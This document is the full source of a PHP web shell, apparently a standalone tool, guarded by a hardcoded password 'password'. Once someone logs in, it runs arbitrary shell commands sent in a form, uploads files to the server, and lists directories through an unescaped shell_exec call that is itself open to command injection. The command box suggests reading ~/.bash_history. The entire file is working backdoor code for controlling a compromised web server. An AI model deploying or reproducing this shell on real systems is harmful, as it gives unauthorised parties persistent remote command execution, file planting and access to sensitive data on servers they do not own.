<?php
session_start();
const PASSWORD = "password";
$logged = false;
$listingDir = getcwd();

if (isset($_POST["disconnect"])) {
    $_SESSION = [];
    session_destroy();
}

if ($_SESSION["logged"]) {
    $logged = true;
}

if (isset($_POST["login"]) && !$logged) {
    $password = $_POST["password"];
    if (PASSWORD == $password) {
        $_SESSION["logged"] = true;
        $logged = true;
    }
}

if ($logged) {
    if (isset($_SESSION["chdir"])) {
        chdir($_SESSION["chdir"]);
    }
    if (isset($_POST["setCWD"])) {
        $_SESSION["chdir"] = $_SESSION["listingDir"];
        chdir($_SESSION["listingDir"]);
    }
    if (isset($_POST["listingPath"])) {
        $_SESSION["listingDir"] = $_POST["listingPath"];
    }

    if (isset($_SESSION["listingDir"])) {
        $listingDir = $_SESSION["listingDir"];
    }

    $path = getcwd();
    $dirContent = preg_split("/\s+/", trim(shell_exec("ls $listingDir")));
    if ($_POST["fileUpload"]) {
        $uploadPath = trim($path)."/".basename( $_FILES["uploadedFile"]["name"]);

        if (move_uploaded_file($_FILES["uploadedFile"]["tmp_name"], $uploadPath)) {
            echo "The file ".  basename( $_FILES["uploaded_file"]["name"]).
                " has been uploaded";
        } else {
            echo "There was an error uploading the file, please try again!";
            echo $uploadPath;
        }
    }
    if (isset($_POST["command"])) {
        $command = $_POST["command"];
        $result = shell_exec($command);
    }
}
?>

<html lang="en">
<head>
    <title>Webshell</title>
    <style>
        * { box-sizing: border-box; padding: 0; margin: 0 }
        * :not(pre) { font-family: sans-serif; }
        body { background: #2d3436 }
        #disconnect { position: fixed; bottom: 10px; right: 10px }
        #reload { position: fixed; bottom: 10px; left: 10px }
        ul { list-style: none }
        #container { display: flex; height: 100vh; width: 100vw }
        input[type="text"] { padding: 5px; width: 80% }
        #leftPart { width: 70%; margin: 0 auto; padding: 20px }
        #rightPart { width: 30%; margin: 0 auto; padding: 20px }
        #cwdListing { margin-top: 10px; padding: 10px; background: lightgrey; height: 80vh; overflow: scroll }
        pre { background: lightgrey; padding: 10px }
        #head { background: #6c7a89; padding: 8px; display: flex; justify-content: center; align-items: center; color: white; border-radius: 5px; margin-bottom: 10px }
        #commandForm { background: #6c7a89; color: white; display: flex; height: 30px; font-size: 13px }
        #commandForm label { padding-left: 10px; display: flex; justify-content: center; align-items: center; border-radius: 5px 0 0 5px }
        #commandForm span { display: flex; justify-content: center; align-items: center; padding-left: 5px  }
        #commandForm input[type="text"] { background: #6c7a89; color: white; border: none; width: 100%; font-size: 13px }
        #commandForm input[type="text"]::placeholder { color: #c1c1C1 }
        #commandForm input[type="submit"] { border-radius: 0 5px 5px 0; min-width: 120px }
        #fileUploadForm { background: #6c7a89; color: white; display: flex; height: 30px; font-size: 13px;  }
        #fileUploadForm span { display: flex; justify-content: center; align-items: center; padding-left: 5px; width: 150px }
        #fileUploadForm input[type="file"] { width: 100%; display: flex; justify-content: center; align-items: center; }
        #fileUploadForm input[type="submit"] { border-radius: 0 5px 5px 0; min-width: 120px; justify-self: flex-end }
    </style>
</head>
<body>
    <?php
    if (!$logged) { ?>
        <h3>You need to be logged in in order to execute a command</h3>
        <form action="" method="POST">
            <label for="password">Password</label>
            <input type="password" name="password" id="password" />
            <input type="submit" name="login" value="login" />
        </form>
    <?php } else { ?>
        <div id="container">
            <div id="leftPart">
                <!-- Head -->
                <h1 id="head">PHP WebShell</h1>
                <!-- Command input -->
                <form action="" method="POST" id="commandForm">
                    <label for="command"><?= $path ?></label>
                    <span>$</span>
                    <input type="text" name="command" id="command" placeholder="tail ~/.bash_history" />
                    <input type="submit" value="Run" />
                </form>
                <!-- File upload -->
                <form enctype="multipart/form-data" action="" method="POST" id="fileUploadForm">
                    <span>Upload a file</span>
                    <input type="hidden" name="fileUpload" value="1">
                    <input type="file" name="uploadedFile" /><br />
                    <input type="submit" value="Upload" />
                </form>
                <!-- Command output -->
                <pre><?= htmlspecialchars($result) ?></pre>
            </div>
            <hr id="separator">
            <div id="rightPart">
                <form action="" method="POST" id="directoryContentForm">
                    <h1>Content of the directory
                    <small>
                        <label for="listingPath">Path: </label>
                        <input type="text" name="listingPath" id="listingPath" value="<?= $listingDir ?>">
                        <input type="button" value="Reset path" onclick="resetPath()">
                        <input type="submit" name="setCWD" value="Set CWD">
                    </small></h1>
                </form>
                <ul id="cwdListing">
                    <li><span class="clickable" onclick="upALevel()">..</span></li>
                    <?php
                    foreach ($dirContent as $file) {
                        echo "<li><span class=\"clickable\" onclick=\"reloadList(this)\">$file</span></li>";
                    }
                    ?>
                </ul>
            </div>
            <!-- Disconnect -->
            <form action="" method="POST" id="disconnect">
                <input type="submit" name="disconnect" value="Disconnect" />
            </form>
            <!-- Reload / DO NOT TOUCH, I KNOW THAT'S CRAP -->
            <input type="submit" value="Reload" id="reload" onclick="location.href = location.href" />
        </div>
        <script>
            let form = document.querySelector("#directoryContentForm");
            function reloadList (elem) {
                form.querySelector("input").value += "/" + elem.innerHTML;
                form.submit();
            }

            function resetPath() {
                form.querySelector("input").value = "<?= getcwd() ?>";
                form.submit();
            }

            function upALevel() {
                let input = form.querySelector("input");
                let newString = input.value.split("/");
                newString.pop();
                input.value = newString.join("/");
                form.submit();
            }
        </script>
    <?php } ?>
</body>
</html>

